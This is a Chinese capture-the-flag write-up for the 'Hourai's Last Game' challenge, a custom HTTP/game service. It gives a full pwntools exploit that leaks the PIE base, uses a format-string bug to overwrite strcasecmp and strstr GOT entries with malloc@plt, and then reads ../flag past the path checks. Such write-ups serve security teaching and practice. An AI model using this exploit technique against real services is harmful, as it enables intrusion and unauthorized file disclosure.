# Hourai's Last Game

## 题目简述

附件实现了一个自定义 HTTP/游戏服务。`send_file_response()` 在文件查找失败时，把用户控制的文件名拼入 `File %s not found`，再把拼接后的整段字符串直接作为格式串传给 `Log()`，形成格式化字符串漏洞。

目标 flag 位于服务进程上一级目录的 `../flag`，但文件接口会经过扩展名与安全路径检查。游戏奖励接口能泄露一个程序内地址，可先计算 PIE 基址；随后利用格式化字符串把 `strcasecmp@GOT` 和 `strstr@GOT` 都改为 `malloc@plt`，破坏两个检查函数的返回语义，最后直接请求 `/../flag`。

## 解题过程

### 泄露 PIE 基址

向奖励接口提交胜利标记，响应中会返回一个地址。该地址相对程序基址的偏移为 `0x1c95`：

```python
io = remote(host, port)
io.send(b"POST /reward\r\n\r\nWin")
io.recvuntil(b"0x")
pie_base = int(io.recv(12), 16) - 0x1c95
io.recvuntil(b'"}')
io.close()
```

拿到基址后可计算题目版本中的关键地址：

```text
malloc@plt      = pie_base + 0x1370
strcasecmp@GOT = pie_base + 0x5028
strstr@GOT      = pie_base + 0x5110
```

### 通过格式化字符串改写 GOT

文件名位于格式化字符串第 660 个参数附近。利用 `%lln` 先把目标 GOT 槽清零，再用 `%hhn` 分别写第 3～6 字节，最后用 `%hn` 写低 2 字节，即可拼出 64 位 `malloc@plt` 地址。附加在文件名缓冲区后的五个地址依次是 `got`、`got+2`、`got+3`、`got+4`、`got+5`。

原 EXP 中的宽度补偿不是通用常量：`Log()` 在处理攻击者格式串前已经输出了固定数量的字符，且每次 `%hhn` 只关心累计输出长度的低 8 位。因此这些数值必须与题目二进制和非调试运行环境保持一致；在 GDB 中测得的参数偏移可能不同。

先覆盖 `strcasecmp@GOT`，再以新的连接覆盖 `strstr@GOT`。两个检查函数被替换为总能返回有效堆指针的 `malloc()` 后，原有扩展名和目录穿越判断失去预期语义。

### 完整 EXP

```python
from pwn import *

host = "127.0.0.1"
port = 8080


def connect():
    return remote(host, port)


def overwrite_strcasecmp(pie_base):
    io = connect()
    got = pie_base + 0x5028
    plt = pie_base + 0x1370

    low16 = plt & 0xffff
    byte2 = (plt >> 16) & 0xff
    byte3 = (plt >> 24) & 0xff
    byte4 = (plt >> 32) & 0xff
    byte5 = (plt >> 40) & 0xff

    fmt = (
        f"%660$lln"
        f"%{byte2 - 5}c%661$hhn"
        f"%{0x100 + byte3 - byte2}c%662$hhn"
        f"%{0x300 + byte4 - byte3}c%663$hhn"
        f"%{0x500 + byte5 - byte4}c%664$hhn"
        f"%{low16 - byte5 - 0x900}c%660$hn"
    ).encode()

    filename = (b"/" + fmt + b".js\x00\x00").ljust(0x74, b"\x00")
    filename += p64(got)
    filename += p64(got + 2)
    filename += p64(got + 3)
    filename += p64(got + 4)
    filename += p64(got + 5)
    filename += p64(0) * 0x60

    io.sendline(b"GET\n" + filename)
    io.close()


def overwrite_strstr(pie_base):
    io = connect()
    got = pie_base + 0x5110
    plt = pie_base + 0x1370

    low16 = plt & 0xffff
    byte2 = (plt >> 16) & 0xff
    byte3 = (plt >> 24) & 0xff
    byte4 = (plt >> 32) & 0xff
    byte5 = (plt >> 40) & 0xff

    fmt = (
        f"%660$lln"
        f"%{byte2 - 5}c%661$hhn"
        f"%{0x100 + byte3 - byte2}c%662$hhn"
        f"%{0x200 + byte4 - byte3}c%663$hhn"
        f"%{0x300 + byte5 - byte4}c%664$hhn"
        f"%{low16 - byte5 - 0x600}c%660$hn"
    ).encode()

    filename = (b"/" + fmt + b".js\x00\x00").ljust(0x74, b"\x00")
    filename += p64(got)
    filename += p64(got + 2)
    filename += p64(got + 3)
    filename += p64(got + 4)
    filename += p64(got + 5)
    filename += p64(0) * 0x60

    io.sendline(b"GET\n" + filename)
    io.close()


io = connect()
io.send(b"POST /reward\r\n\r\nWin")
io.recvuntil(b"0x")
pie_base = int(io.recv(12), 16) - 0x1c95
io.recvuntil(b'"}')
io.close()
log.success(f"PIE base: {pie_base:#x}")

overwrite_strcasecmp(pie_base)
sleep(0.2)
overwrite_strstr(pie_base)
sleep(0.2)

io = connect()
io.send(b"GET\n/../flag")
print(io.recvall(timeout=3).decode(errors="replace"))
io.close()
```

最后一个响应会返回 `../flag` 的内容。原始材料没有给出固定 flag 文本，因此应以比赛实例的实际响应为准。

## 方法总结

本题把信息泄露、格式化字符串任意写和业务校验绕过串成一条链。PIE 泄露解决地址随机化，`%n` 系列写入则定点修改 GOT；相比把某个函数末字节爆破成 `system`，直接劫持两个校验依赖函数更稳定。复现时最容易出错的是格式化字符串参数偏移和累计输出字节数，必须在与远端一致的非调试环境中校准。
